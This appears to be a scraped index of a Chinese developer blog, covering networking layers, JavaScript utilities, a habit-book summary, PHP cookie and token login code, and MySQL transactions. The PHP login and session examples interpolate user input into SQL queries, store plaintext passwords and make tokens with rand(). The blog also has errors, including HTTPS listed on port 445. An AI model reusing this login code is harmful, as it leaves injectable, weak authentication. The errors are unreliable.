即時戰況」等等，如果對應到網路的世界就是「HTTP」、「FTP」、「SMTP」等等。 備註：服務跟協議可能蠻常搞混的，簡單來說你可以想成「訂便當服務」採用的是「訂便當協議」；「HTTP 服務」採用的是「HTTP 協議」；「FTP 服務」採用的是「FTP 協議」。每個服務都會有採用一個對應的協議來決定雙方之間的溝通方式。 這些服務可能都匯集在同一台主機上，而為了讓每個服務各司其職，會用「port」來代表每個服務的端口（連接埠），你想要用哪個服務，就輸入對應的端口號碼，常見的 port 為： HTTP 80（預設） HTTPS 445 FTP 21 例如我想用 google 主機上的 HTTP 服務，我可以在網址輸入： 1172.217.160.110:80 不過因為預設就是採用 80 這個 port，所以其實就算不輸入也沒關係。 另外，因為不同服務採取的協議不同，所以內容格式也會不同，例如訂便當的格式比較複雜，但借籃球的格式就很簡單。 訂便當（HTTP）的格式是： 標準化內容格式 把內容分成 header 跟 body 用狀態碼標準化結果（回應） 用動詞標準化動作（請求） 在訂便當的例子裡是： 12345POST送達時間：第四堂----------------雞腿飯 5雞排飯 2 對應到網路的話會是： 12345POSThttps://reqres.in/api/users/1--------------------------------\"name\": \"PeaNu\"\"job\": \"F2E\" 傳輸層簡單來說就是：用什麼方式傳遞資料？ 最常見的兩個協議： TCP 保證雙方都能接收跟傳遞到訊息（因為有三次握手） UDP 不保證訊息能接收，但速度比較快 「訂便當」這個應用建立在《紙條保證傳得到通訊協定》（或者說是 TCP）之上，目的是讓訂便當的同學確定自己的訊息能被接收到。但是像「NBA 即時戰況」就沒有必要建立在《紙條保證傳得到通訊協定》上，因為重視的是即時性，如果每一次都要經過三次確認的話會很麻煩。 網路互連層簡單來說就是：用什麼方式表示寄件人與收件人？ 也就是我們常聽到的「IP（Internet Protocol）」。但要注意 「IP」跟「IP 地址」兩個是不一樣的意思，前者指的是協議本身，後者指的是這個協議下規範的一個東西（也就是地址）。所以我們口語常說的「IP」，正確來說應該是「IP 協議下規範的那個 IP 地址」。 跟 IP 相關的協議有： IPv6 IPv4 IPv6 的 IP 地址：2001:b011:c005:5d0a:453:4df:cccb:e8dfIPv4 的 IP 地址：192.168.1.104 主要就是版本的差異，前者新後者舊，然後 IPv4 最大的問題就是能儲存的數字比較短，所以會碰到 IP 不夠大家用的問題，所以才有了 IPv6 來解決這個問題。 網路存取層簡單來說就是：實際上要怎麼做到傳紙條這件事？ 以實際上來說： 海底電纜 路由 其實就是實際物理上的東西，要傳送紙條一定得透過「同學」或是「郵差」來做到傳紙條這件事。對應到網路也一樣，要傳送資訊一定得透過「海底電纜」或是「路由」來做到傳遞訊號跟資料這件事。畢竟不可能會有用念力把東西從 A 傳到 B 這種不科學的事情發生。 分層的概念最後只是想提醒一下，之所以會用「層」來解釋這些東西，是因為每一層之間都有相對應的關係。例如說「訂便當」這個服務是基於《紙條保證傳得到通訊協定》跟《你是誰/要傳給誰協定》之上。 所以要做溝通這件事，一定會經過：應用層 =&gt; 傳輸層 =&gt; 網路互連層 = &gt;網路存取層 這幾個不同的層，不可能會有少掉哪一層的情況。 但同時也要知道，每一層之間其實可以採取不同的協議，像是「訂便當」採取《紙條保證傳得到通訊協定》這個協議來作為傳輸方式，但「NBA 即時戰況」就不採取。其實就看你的需求是什麼，並沒有哪個服務一定要用哪一個協議才是最正確的。你甚至可以自己創造一個新的協議。","link":"/2022/01/04/tcp-ip-model/"},{"title":"從 PHP 培養使用三元運算子的好習慣","text":"還蠻神奇的。 簡述在 JavaScript 裡面可以這樣寫： 12let isTrue = true;isTrue ? console.log('yes') : console.log('no'); 但如果你用同樣的邏輯在 PHP 這樣寫： 12$isTrue = true;$isTrue ? echo 'yes' : echo 'no'; PHP 會直接噴 Parse Error。 比較好的做法總之呢，盡量不要在三元運算子裡面去 call 別的 function，最好是單純「給值」就好。（雖然在 PHP 的範例只有 echo 不能這樣寫，但建議養成這個習慣比較好。） 像剛剛的 JavaScript 應該改成這樣： 12let isTrue = true;console.log(isTrue ? 'yes' : 'fasle'); PHP 也一樣： 12$isTrue = true;echo $isTrue ? 'yes' : 'no'; 這樣就不會噴 error 了。","link":"/2022/02/16/ternary-operator-funny-thing/"},{"title":"三元運算子","text":"就…如題啦。 一切都是因為太懶 為什麼這樣說？因為以往在定義一個變數的「布林值」的時候我會這樣寫： 12var score = 60var isPass = (score &gt;= 60) isPass 就會儲存 true 或 fasle。 可是如果我想儲存的是 'Pass' 或 'Fail' 就沒辦法這樣寫了。 懶就要懶到極致。 於是三元運算子登場了： 12var score = 60var message = score &gt;= 60 ? 'Pass' : 'Fail' 以上純屬我唬爛，它應該還是有一些別的意義的，但我覺得用這種方式來理解也蠻說得通的。 可以巢，但先不要它確實可以巢狀，但良心建議還是用在「不是 A 就是 B」的這種情況就好，不然你可能會想掐死當初寫這份 code 的傢伙： 123var score = 100var message = score &gt;= 60 ? (score === 100 ? 'Perfect' : 'Pass') : 'Fail'console.log(message) // Perfect 好 if ，不用嗎？ 12345678910var score = 100var message if (score === 100) { message = 'Perfect'} else if (score &gt;= 60) { message = 'Pass'} else { message = 'Fail'}console.log(message) // Perfect","link":"/2021/12/17/ternary-operator/"},{"title":"清除雜訊的重要性","text":"在我夢到了一堆水豚君後領域到的事情。 關於雜訊我們在理解一個資訊的時候，很多時候會被各種雜訊給干擾，導致沒有辦法得到真正想知道的資訊。又或者是學習的時候，常常會被一長串的內容給混淆，導致自己沒有弄懂作者想表達的是什麼，或是一段敘述想表達的是什麼；一段程式碼在做什麼？ 昨天在寫 實作模組機制 的時候，我體會到了「雜訊」帶來的影響：你不知道問題出在哪裡，為什麼無法理解一段內容？ 在我寫完那篇文章後，我體會到一件事情。 我們之所以會看不懂別人的文章，是因為雜訊太多了。 我的例子要實作一個陽春版的模組機制，只需要下面的程式碼就可以達成： 12345678910111213141516171819202122232425function utilis(module) { function calculate(n) { return ((n * 100 + 20 - 4)) % 10 + 3 } module.exports = { cal: calculate, name: 'hello' }}function main(require) { // './utils' 只是示意用，與實作內容無關 var obj = require('./utils') console.log(obj.cal(30)) // 9 console.log(obj.name) // hello}var m = {}utilis(m) // 輸出模組var r = function() { return m.exports}main(r) // 引入模組 但是我一開始卻沒有辦法一眼就看出來這段程式碼實際上做了什麼，也不理解為什麼這樣就可以實現模組機制。 直到我真正開始寫文章後，試著自己一行一行把程式碼打出來，我才真正理解這段程式碼的意思；但更重要的是，我查覺到「為什麼一開始沒辦法理解這段程式碼」的原因。 人腦內建的快速計算功能為什麼特別強調「一行一行把程式碼打出來」這個動作？ 因為這是一個關鍵點，一個讓我發現自己原來不懂的地方是 物件被傳入 function 修改時的行為。。 換句話說，其實只是一個小地方讓我沒辦法釐清整個程式碼的邏輯，但卻因為當時地我不知道問題是出在這裡，所以才一直到我開始實作後才真正理解問題的發生點。 你可能還是很疑惑我到底想表達什麼？ 我想表達的是，寫字或敲鍵盤能夠讓我們更容易去理解一個概念，因為在寫每一個字的時候，我們能夠更聚焦每一個字想傳達的意思。 舉例來說，請你從下面的數字裡找出「最小的那一個」： 5、3、0、7、4、9 我相信你「一眼」就能看出是 0。 但是現在如果問你，其他的數字是什麼，你能回答出來嗎？ 你可能也意識到了，除非你刻意的放慢速度，讓自己「一個字一個字」的去看，否則你很可能會忽略掉其他的數字。 現在讓你再做一次。不過這一次要改用寫的，或者是用打的來分析每個數字的大小： 2、3、6、7、4、1 現在的你應該就能隱約記得每一個數字是多少了。 其實只是從這個過程中體會到，在我們的生活中，有多少事情是像這樣子被我們人腦內建的「快速計算」給忽略掉，而我們自己都沒有查覺到。 我想把這件事情給記錄下來，也想提醒自己，遇到真的不太懂的事情時，其實可以自己試著把雜訊給剔除，把你已經知道的部分給剔除，專注在你真正想理解的地方。 對我而言，打字或是寫下來就是一種最專注也最不會被雜訊給干擾的方式。","link":"/2021/12/24/the-noise-in-our-life/"},{"title":"The-power-of-habit 讀後紀錄","text":"紀念一下今天把這本書看完了。 做個紀念 另外也做個簡短的筆記，讓自己以後想改變習慣時可以參考。 找出慣行行為日常生活中可能有很多慣性動作，例如說「下午離開桌子到咖啡店買一片巧克力餅乾，接著和朋友聊天的時候把餅乾吃掉」。 找出被滿足的慾望是什麼？找出慾望的方式是：做點實驗 以上面的例子可以這樣做： 第一天，不要跑去咖啡館，而是去附近走一走，不要吃任何東西就回到桌前 第二天，走到咖啡館買一個甜甜圈或巧克力棒，然後回到桌前吃 第三天，走到超市買一顆蘋果，然後一邊跟朋友聊天，一邊吃下去。 第四天，不要去咖啡館，嘗試改喝咖啡，然後回到辦公室跟朋友閒聊幾分鐘，最後回到自己的桌前。 這些是用來測試究竟是什麼驅使了慣行行為。 如果是餅乾？那是因為餓嗎？如果是的話，那蘋果應該也可以滿足這個慾望。或者想打起精神？那咖啡應該也可以滿足。 另外，在嘗試這些不同獎勵時，完成活動回到桌前的時候，可以拿一張紙寫下你當時腦海中想到的三件事。這樣做的意義是 強迫自己意識到自己在想什麼？ 接著，15 分鐘後你可以問自己「還想吃餅乾嗎？」。如果是，那就代表渴望糖分不是引發這個習慣的洞悉。或是與同事閒聊完後，你還是想吃餅乾，那就代表與人交流不是驅使你行為的東西。 篩選提示因為生活周遭有太多的雜訊，所以你可以試著篩選出「你想要專注的幾個提示」，在做出某個慣行行為時的： 地點 時間 情緒狀態 其他人 做習慣動作之前的行為 如果在做出某個慣行行為時，哪一個項目經常出現，那很有可能那就是觸發這個行為的「提示」 立下計畫以上面的例子為例： 提示：時間在下午三點半左右 慣行行為：走到咖啡館、買餅乾、跟朋友聊天 獎勵：透過實驗發現結果是，短暫的休息與社交機會 所以計劃就會是：每到下午三點半時，我要走到朋友桌邊聊天十分鐘 這份計畫絕對不會一開始就執行的很順利，但當你逐漸把這個「新的習慣」養成時，你自然就會不自覺的去做這件事，而不用再有「刻意去做」的感覺。","link":"/2021/12/23/the-power-of-habit/"},{"title":"當 Cookie 被竄改會怎麼樣？","text":"就糟糕啦～ 簡述上次在 利用 Cookie 實作登入機制 中已經實作出一個基本的登入功能，但文末有提過這樣會有 cookie 被竄改的問題。這篇文章就來解釋一下是什麼問題？以及該如何解決？ 假冒別人身分既然 cookie 值可以任我改，那只要知道其他人的 username 是什麼就可以假冒身分了： 補充一下「新增留言」的程式邏輯，不然會看不太懂： 12345678910111213141516171819202122232425262728293031323334/* handle_add_comments.php */&lt;?php require_once('./conn.php'); require_once('./utils.php'); // 透過 cookie 拿到目前的 user $username = $_COOKIE['username']; // 撈出 user 資料 $user = getUser($username); // 從 user 資料中找出暱稱的欄位 $nickname = $user['nickname']; // 用 POST 帶過來的留言內容 $content = $_POST['content']; // 檢查留言內容 if (empty($content)) { header('Location: index.php?errorCode=1'); die(); } // 加到資料庫 $sql = sprintf( \"INSERT INTO comments(`nickname`, `content`) VALUES ('%s', '%s')\", $nickname, $content ); try { $result = $conn-&gt;query($sql); header('Location: index.php'); } catch (Exception $e) { echo '執行失敗：' . $e-&gt;getMessage() . '&lt;br&gt;'; echo '錯誤代碼：' . $conn-&gt;errno; }?&gt; 簡單來說，當 request 送出去時，handle_add_comments.php 會從 cookie 的內容找出對應的 user，取得使用者資訊後再把內容寫到資料庫裡。也就是說 cookie 寫誰就代表誰 的意思，因此最後留言的才會是無慘而不是煉獄。 解決辦法前面這種「把資訊都存在瀏覽器的 Cookie」的做法其實叫做「Cookie-based session」，但現在要換個思維，我們可以改成「把資訊存在 Server 端」來處理，這種作法叫「Session Identifier」。 意思是說，要存在 cookie 的東西不是資訊本身，而是一個類似「通行證」的東西。就好像你去好市多購物要檢查會員卡一樣，「會員卡」就是要用來放在 cookie 裡面給 Server 識別的東西。 話說回來，剛剛說把要儲存的資訊放在 Server 端，但實際上是指哪裡？ 當然就是 資料庫 囉！ 我們可以新開一個叫做 tokens 的資料庫，專門放每個 token 對應到哪個 user，像這樣： 現在還沒存任何東西所以欄位都是空的。 總之呢，登入這一段要做的事情很簡單： 當登入成功後，產生一個 token 把 token 寫到 cookie，並且把 token 對應到的 user 寫到資料庫中 1234567891011// 先寫好產生 token 的 function&lt;?php function generateToken() { $s = ''; for ($i=0; $i&lt;15; $i++) { // A ~ Z $s .= chr(rand(65,90)); } return $s; }&gt; 1234567891011121314151617181920212223242526272829303132333435/* handle_login.php */&lt;?php require_once('./conn.php'); require_once('./utils.php'); // POST 過來的帳號密碼 $username = $_POST['username']; $password = $_POST['password']; // 檢查帳號密碼 $sql = \"SELECT * FROM users WHERE username='$username' AND password='$password'\"; $result = $conn-&gt;query($sql); /* 帳號密碼正確的話： 1. 產生 Token 2. 把 Token 跟對應的 username 存到資料庫 3. 把 Token 存到 cookie 中 */ if ($result-&gt;num_rows &gt; 0) { // 產生 Token $token = generateToken(); // 下 query $sql = \"INSERT INTO tokens(`token`, username) VALUE('$token', '$username')\"; $conn-&gt;query($sql); // cookie 過期時間 $expire = time() + 3600 * 24 * 30; // 設定 cookie setcookie('token', $token, $expire); // 登入成功，導回首頁 header('Location: ./index.php'); } else { // 登入失敗 header('Location: ./login.php?errorCode=2'); }?&gt; 接下來的 index.php 的流程也差不多，只是稍微多幾個步驟： 根據 cookie 中的 token 去 tokens（table） 找到對應的 username 拿 username 去 users（table） 找到對應的 user 12345678910111213141516/* index.php */&lt;?php require_once(\"./conn.php\"); require_once(\"./utils.php\"); // 沒登入的話就是 null $username = Null; // 檢查 cookie 中的 token if (!empty($_COOKIE['token'])) { $token = $_COOKIE['token']; // 用 token 去拿 user 資料 $user = getUserFromToken($token); $username = $user['username']; $nickname = $user['nickname']; }?&gt; 一樣附上 getUserFromToken($token) 的程式邏輯： 1234567891011121314151617181920212223/* utils.php */&lt;?php require_once('./conn.php'); function getUserFromToken($token) { // 存取全域變數要記得用 global global $conn; // 先從 tokens 中找到對應的 username $sql = \"SELECT username FROM tokens WHERE token='$token'\"; $result = $conn-&gt;query($sql); // 代表沒有找到對應的 user，回傳 Failed if ($result-&gt;num_rows === 0) { return 'Failed'; } // 成功拿到 tokens 中的 username $row = $result-&gt;fetch_assoc(); $username = $row['username']; // 下第二個 query $sql = \"SELECT * FROM users WHERE username='$username'\"; $result = $conn-&gt;query($sql); // 這邊就是 user 的資料了，傳回去 return $result-&gt;fetch_assoc(); }?&gt; 最後一樣就完成登入機制了，但跟剛剛不同的是現在沒辦法再竄改 cookie 來假冒別人身分： 一樣附上「新增留言」的程式邏輯： 123456789101112131415161718192021222324252627282930313233343536&lt;?php require_once('./conn.php'); require_once('./utils.php'); /* 這邊一樣是存取 cookie 值， 但是當 token 不正確時，getUserFromToken($token) 會回傳 Failed， 所以下面的 $nickname = $user['nickname'] 就會噴 Fatal error， 你可以把這邊改成導回 index.php?errorCode=2 顯示錯誤訊息之類的。 總之，這邊的重點是要說明沒辦法再竄改 cookie 了而已。 */ $token = $_COOKIE['token']; $user = getUserFromToken($token); $nickname = $user['nickname']; $content = $_POST['content']; // 檢查留言內容 if (empty($content)) { header('Location: index.php?errorCode=1'); die(); } // 加到資料庫 $sql = sprintf( \"INSERT INTO comments(`nickname`, `content`) VALUES ('%s', '%s')\", $nickname, $content ); try { $result = $conn-&gt;query($sql); header('Location: index.php'); } catch (Exception $e) { echo '執行失敗：' . $e-&gt;getMessage() . '&lt;br&gt;'; echo '錯誤代碼：' . $conn-&gt;errno; }?&gt; 以上就是解決 cookie 被竄改的應對方法，以及 Session Identifier 的概念，把資料存在 Server，Cookie 只存 Token（或叫 Session ID）。 最後補充一下，登出的時候不要忘了把資料庫中的 token 給清掉： 1234567891011/* handle_logout.php */&lt;?php require_once('./conn.php'); $token = $_COOKIE['token']; // 先刪除資料庫中的內容 $sql = \"DELETE FROM tokens WHERE token='$token'\"; $conn-&gt;query($sql); // 再清除 cookie setcookie('token', '', time() - 3600); header('Location: ./index.php');?&gt; 後記其實 PHP 裡面就有內建的 session 機制，用法可以參考這篇：PHP 內建的 session 方法 雖然內建方法用起來簡單，而且也比較穩定，但自己手工實作一遍確實會對「Session Identifier」的概念有更深的理解，所以才會想寫篇文章來做紀錄。","link":"/2022/02/08/the-problem-of-cookie/"},{"title":"npm script 與 npx 的用途","text":"解決多年疑惑。 為什麼用 npm run 或 npx 就可以執行？（這裡以 jest 來舉例） 在執行 jest 指令的時候你可能會用以下幾種方式： 直接在 terminal 上執行 jest 指令 透過 package.json 的 srcipt 執行 npm run xxx 透過 npx jest xxx 如果是 2、3 的話都沒問題，但 1 的話你應該會直接得到錯誤： 主要是因為：指令的儲存位置 以這個例子來說，jest 是安裝在「專案底下」，而不是安裝在「全域」的電腦系統裡。 在 terminal 上執行 jest 指令時，它會到系統裡面去找有沒有 jest 這個指令？但因為它找不到，所以最後就會噴 error。 而 npm srcipt 跟 npx jest 指令可以正常執行，是因為它們都會自動到專案底下去找有沒有你輸入的這個指令，也就是 jest。最後有找到，所以順利執行。 簡單來說，一個是「從系統裡面找」，一個是從「專案裡面找」，只是這樣的差異而已。","link":"/2021/12/24/the-purpose-of-npm-script-and-npx/"},{"title":"閉包的實際應用：throttle 和 debounce","text":"這個例子有趣很多。 throttlethrottle 的直翻是「節流」。 如果你跟我一樣無聊，有研究過汽機車的引擎運作原理的話，那你應該知道「節流閥」是什麼，還有它的用途。throttle 的意思跟它還蠻類似的（我覺得啦）。 當然，沒研究過的話也沒關係。 簡單來說，throttle 的概念可以想成是一扇門，當有一個人通過這扇門，這扇門就會關起來，必須等一段時間後這扇門才會再次打開，讓下一個人通過。throttle 就是一直循環這個流程： 有人通過 &gt; 把門關起來 &gt; 等待 n 秒 &gt; 把門打開 所以利用 throttle 就能控制每隔幾秒讓一個人通過，這就是它的用途。 回到前端的部分，這可以用在你不希望「某個事件在短時間內重複觸發」，例如最常見的：scroll： 先來看沒有 throttle 的情況： 加了 throttle 以後（delay 時間為 250ms）： 實作 throttle這邊的實作方式是寫一個 throttle 函式，接收兩個參數： fn 要執行的 function delay 要等待的時間 把 function 丟進去後會回傳一個新的 function，這個 function 必須每隔幾秒才能 call 一次。 12345678910111213141516function throttle (fn, delay) { let isTimeout = true; function newFunc (...argu) { // 如果門是開著的 if (isTimeout) { // 把門關上 isTimeout = false; // call function fn(...argu); // 幾秒後再把門重新打開 setTimeout(() =&gt; isTimeout = true, delay) } } return newFunc}module.exports = throttle; 這邊被關在閉包中的變數為：isTimeout、delay 和 fn 最後附個測試檔： 12345678910111213141516171819202122232425262728293031323334const throttle = require('./throttle');describe(\"throttle\", () =&gt; { it('can not retrigger function during the time', async () =&gt; { // 替身 function，預設回傳值為 undefined const fn = jest.fn(); const throttleFn = throttle(fn, 250); // 呼叫第一次 throttleFn(10); // 檢查第一次是否有執行 expect(fn).toHaveBeenCalledWith(10); // 呼叫次數：1 expect(fn.mock.calls.length).toBe(1); // 等待 delay await sleep(250); // 再呼叫一次，看看是否執行 throttleFn(20) expect(fn).toHaveBeenCalledWith(20); // 呼叫次數：2 expect(fn.mock.calls.length).toBe(2); // 等待 delay await sleep(250); // 多次呼叫，真正被呼叫的應該只有第一個 throttleFn(\"b\", \"a\"); for (let i=1; i&lt;=100; i++) { throttleFn(\"a\", \"b\", \"c\"); } expect(fn).toHaveBeenCalledWith('b', 'a'); // 呼叫次數：3 expect(fn.mock.calls.length).toBe(3); })}) debouncedebounce 的直翻是「防抖」。 debounce 跟 throttle 的概念有點「類似」（只是觀念類似，但用途差很多），但我暫時想不到比較生活化的例子，所以直接拿前端的實際應用來舉例。 用過 google 搜尋的話應該都知道輸入文字時會有 auto complete 的功能： 這個功能的實作大概會長這樣： 1234567$('input').on('input', async function () { // 取得輸入內容 const value = this.value; // 發 request 到後端拿資料（相關的關鍵字） const result = await getAutoComplete(value); // 把結果渲染到畫面上...}) 但這樣有個問題，如果搜尋「花生醬批發」，程式會這樣跑： 12345678910111213141516171819取得關鍵字「花」發 request 查詢跟「花」相關的關鍵字把結果渲染到畫面上取得關鍵字「生」發 request 查詢跟「生」相關的關鍵字把結果渲染到畫面上取得關鍵字「醬」發 request 查詢跟「醬」相關的關鍵字把結果渲染到畫面上取得關鍵字「批」發 request 查詢跟「批」相關的關鍵字把結果渲染到畫面上取得關鍵字「醬」發 request 查詢跟「發」相關的關鍵字把結果渲染到畫面上 問題是指我每打一個字，就會發一個 request 到後端去。 這樣子的效能不好，明明我只是想搜尋「花生醬批發」而已，卻要發 5 次 request。 比較好的做法是： 在輸入文字時，先設定一段時間（這段時間被稱為「threshold 閾值」），在這期間輸入文字的話就得重新等待，必須等到時間結束時都沒有輸入文字，才會發 request 去拿資料。 這個就是 debounce 的作用。 接著來演示一段沒有 debounce 的情況： 加了 debounce 以後： 實作 debounce這邊一樣會實作一個函式 debounce，接收兩個參數： fn 要執行的函式 delay 要等待的時間 把 function 丟進去後會回傳一個新的 function，這個 function 會以 debounce 的方式來執行： 1234567891011function debounce(fn, delay) { let timer = null; function newFunc (...argu) { if (timer) { clearTimeout(timer); } timer = setTimeout(() =&gt; fn(...argu), delay); } return newFunc;}module.exports = debounce; 一樣附上測試檔： 1234567891011121314151617181920212223242526272829303132const debounce = require('./debounce');describe(\"debounce\", () =&gt; { it('should trigger function after certain delay', async () =&gt; { // 替身 function，預設回傳值為 undefined const fn = jest.fn(); const debouncedFn = debounce(fn, 250); debouncedFn(10); // 還不能被呼叫 expect(fn).not.toHaveBeenCalledWith(); // 等待 delay await sleep(250); // 檢查呼叫時傳入的參數是否為 10 expect(fn).toHaveBeenCalledWith(10); // 檢查呼叫次數是否為一次 expect(fn.mock.calls.length).toBe(1); // 多次呼叫 debouncedFn(\"b\", \"a\"); debouncedFn(\"d\", \"e\"); debouncedFn(\"a\", \"b\", \"c\"); expect(fn.mock.calls.length).toBe(1); // 等待 delay await sleep(250); // 檢查呼叫次數是否為兩次（加上前面的） expect(fn.mock.calls.length).toBe(2); // 檢查呼叫時傳入的參數是否為 a b c（確認是最後一個 functino 被呼叫） expect(fn).toHaveBeenCalledWith(\"a\", \"b\", \"c\"); })})","link":"/2022/03/21/throttle-and-debounce/"},{"title":"圈圈叉叉","text":"來自 LIOJ 上的題目。這題在考二維陣列的應用，覺得還真的蠻容易搞混的，所以想記錄下來。 解題方向最簡單的方式就是窮舉所有會贏的可能： 12345678910111213141516171819OOO------- O O O------- O O O-------O O O------- O OO 關於二維陣列由於拿到的資料會是 ['ooo', 'xxo', 'xxo']，所以如果要取出每一行的字串的話： 123'ooo' // lines[0]'xxo' // lines[1]'xxo' // lines[2] 如果要取出每行的一個字元的話： 123456789101112ooo'o' // lines[0][0]'o' // lines[0][1]'o' // lines[0][2]xxo'x' // lines[1][0]'x' // lines[1][1]'o' // lines[1][2]xxo'x' // lines[2][0]'x' // lines[2][1]'o' // lines[2][2] （上下一起對照著看，比較不會搞混） 如果現在我們想要看「橫排」的每一個字元有沒有相同？會發現可以利用迴圈來做： 12345for(let i=0; i&lt;3; i++) { if(lines[i][0] === lines[i][1] &amp;&amp; lines[i][1] === lines[i][2]) { return lines[i][0] }} 每一行要檢查的字元都固定為 [0][1][2]，需要改變的只有前面代表「行數」的索引值。 反過來，如果要看「直排」的每一個字元有沒有相同？也可以用迴圈來做： 1234567891011'o' // lines[0][0]'x' // lines[1][0]'x' // lines[2][0]'o' // lines[0][1]'x' // lines[1][1]'x' // lines[2][1]'o' // lines[0][2]'o' // lines[1][2]'o' // lines[2][2] 12345for(let i=0; i&lt;3; i++) { if(lines[0][i] === lines[1][i] &amp;&amp; lines[1][i] === lines[2][i]) { return lines[0][i] }} 每一個字元要檢查的固定行數為 [0][1][2]，需要改變的只有後面代表「字元」的索引值。 所以這樣就處理完「橫排」跟「直排」的部分了，接下來只要把「斜排」的部分也做完就搞定： 1234567'o' // lines[0][0]'x' // lines[1][1]'o' // lines[2][2]'o' // lines[0][2]'x' // lines[1][1]'x' // lines[2][0] 這裡沒有辦法寫成迴圈，所以直接判斷就好： 123456if(lines[0][0] === lines[1][1] &amp;&amp; lines[1][1] === lines[2][2]) { return lines[0][0]}if(lines[0][2] === lines[1][1] &amp;&amp; lines[1][1] === lines[2][0]) { return lines[0][2]} 工具都備好了，最後只要集合起來就完成囉： 123456789101112131415161718192021222324function whoWin(lines) { // 橫排 for(let i=0; i&lt;3; i++) { if(lines[i][0] === lines[i][1] &amp;&amp; lines[i][1] === lines[i][2]) { return lines[i][0] } } // 直排 for(let i=0; i&lt;3; i++) { if(lines[0][i] === lines[1][i] &amp;&amp; lines[1][i] === lines[2][i]) { return lines[0][i] } } // 斜排 if(lines[0][0] === lines[1][1] &amp;&amp; lines[1][1] === lines[2][2]) { return lines[0][0] } if(lines[0][2] === lines[1][1] &amp;&amp; lines[1][1] === lines[2][0]) { return lines[0][2] } // 以上都沒有通過，代表平手 return 'DRAW'} 另一種選擇如果二維陣列不好理解的話，你也可以把資料轉換成一行字串，例如說 'oooxxoxxo'，接著在照著上面的做法也是 ok。 先用數字表示位置： 1234567o o ox x ox x o0 1 23 4 56 7 8 橫排的情況： 1230 1 23 4 56 7 8 12345678910let str = 'oooxxoxxo'for(let i=0; i&lt;3; i++) { // i=0 =&gt; n=0 // i=1 =&gt; n=3 // i=2 =&gt; n=6 let n = i*3 if(str[n] === str[n+1] &amp;&amp; str[n+1] === str[n+2]) { return str[n] }} 直排的情況： 1230 3 61 4 72 5 8 123456789let str = 'oooxxoxxo'for(let i=0; i&lt;3; i++) { // i=0 =&gt; 0 3 6 // i=1 =&gt; 1 4 7 // i=2 =&gt; 2 5 8 if(str[i] === str[i+3] &amp;&amp; str[i+3] === str[i+6]) { return str[i] }} 斜排的情況： 120 4 82 4 6 123let str = 'oooxxoxxo'if(str[0] === str[4] &amp;&amp; str[4] === str[8]) return str[0]if(str[2] === str[4] &amp;&amp; str[4] === str[6]) return str[2] 最後一樣組合起來就大功告成： 12345678910111213141516171819202122232425262728function whoWin(str) { // 橫排 for(let i=0; i&lt;3; i++) { // i=0 =&gt; n=0 // i=1 =&gt; n=3 // i=2 =&gt; n=6 let n = i*3 if(str[n] === str[n+1] &amp;&amp; str[n+1] === str[n+2]) { return str[n] } } // 直排 for(let i=0; i&lt;3; i++) { // i=0 =&gt; 0 3 6 // i=1 =&gt; 1 4 7 // i=2 =&gt; 2 5 8 if(str[i] === str[i+3] &amp;&amp; str[i+3] === str[i+6]) { return str[i] } } // 斜排 if(str[0] === str[4] &amp;&amp; str[4] === str[8]) return str[0] if(str[2] === str[4] &amp;&amp; str[4] === str[6]) return str[2] // 平手 return 'DRAW'}","link":"/2021/12/28/tic-tac-toe/"},{"title":"關於 MySQL 中的 boolean","text":"小知識。 簡述其實 boolean 只是把 TINYINT 長度設為 1 的別名（Alias），所以你其實也可以自己設： 長度 1 代表只可能出現 0 ~ 9，所以只要不是 0 都代表 true。","link":"/2022/02/14/tiny-int-and-boolean/"},{"title":"資料庫中的 Transaction、ACID 和 Lock","text":"有趣的東西。 ACID 與 Transaction我覺得在講 ACID 之前，先理解 transaction 是什麼會比較有幫助，所以這裡先解釋一下 transaction 是什麼。 先來看一下維基百科對 transaction 的定義： 資料庫交易（簡稱：交易）是資料庫管理系統執行過程中的一個邏輯單位，由一個有限的資料庫操作序列構成。 好，應該有看沒有懂，我也一樣。 總之呢，這邊只要把重點放在「單位」這個詞就好。可是還是有點抽象，什麼叫做單位？ 來舉個例子吧，假設我有一個操作是「把 A 轉 20 塊給 B」，要完成這項操作會需要兩個 SQL 指令： 把 A 的錢扣 20 塊 把 B 的錢加 20 塊 我們會把 1 跟 2 都當成是一個 transaction，第一個 transaction 是「把 A 的錢扣 20 塊」，另一個是「把 B 的錢加 20 塊」。所以說呢，現在有「兩個」transaction，這個就是單位的意思。 好，這跟 ACID 又有什麼關係？ 這要先談一下 transaction 本身的問題，有些時候我們無法確保一個 transaction 的結果會如我們所想。像上面的例子，如果 A 只有 20 塊，在 A 的錢還沒被扣掉時，突然又插入一個新的操作是把 A 的錢轉給 C，這個時候就有可能出現明明 A 只有 20 塊卻轉了 40 塊給 B 和 C 的結果發生。 這樣的 transaction 是不好的，我們希望盡量避免這種事情發生，所以才建立了一套原則，就是 ACID： Atomicity 原子性：要嘛全部成功 or 失敗 Consistency 一致性：資料的總數要一樣，例如 A 跟 B 的錢原本加起來有 100 塊，那不管他們轉幾次帳，最後加起來應該也要是 100 塊 Isolation 隔離性：A 一次只能轉帳給一個人，如果要轉帳給下個人，就要等上個人結束後再轉給下個人。 Durability 持久性：寫入的資料要放在一個可以永久保存的地方 這邊可能比較抽象，不過我覺得只要知道 ACID 是用來確保 transaction 的結果可以按照我們所想，這一點就夠了。專有名詞的部分只要看個概念就好，不用一定要完全理解。 怎麼在 PHP 使用 transaction1234567# 預設是 true，一個 query 就是當成一個 transaction$conn-&gt;autocommit(FALSE);$conn-&gt;begin_transaction();$conn-&gt;query(\"UPDATE money set amount = 20\");$conn-&gt;query(\"UPDATE money set sum = 20\");// 到這一行才是真的執行，所以會把上面兩個 query 當成一個 transaction$conn-&gt;commit(); 流程： 上面兩個 query 會同時執行，而且保證都成功 or 失敗 如果有很多個 query 可以利用這種方式來執行，效能會比較好。 附註：如果要用 transaction 的功能，要先確認資料庫的引擎是什麼。 以 MySQL 和 MariaDB 來說是 innoDB，這兩個有支援。但如果是 MyISAN 就不支援。 lock直接舉例子會比較好懂一點，先來段程式碼： 12345678910111213141516171819require_once('conn.php');$stmt = $conn-&gt;prepare(\"SELECT amount from products where id = 1 for update\");$stmt-&gt;execute();$result = $stmt-&gt;get_result();// 有抓到資料就顯示 amount 數量if ($result-&gt;num_rows &gt; 0) { $row = $result-&gt;fetch_assoc(); echo \"amount: \" . $row['amount']; // amount &gt; 0 的話就發一個 query 把 amount - 1 if ($row['amount'] &gt; 0) { $stmt = $conn-&gt;prepare(\"UPDATE products SET amount = amount - 1 WHERE id = 1\"); if ($stmt-&gt;execute()) { echo '購買成功'; } }}$conn-&gt;commit(); 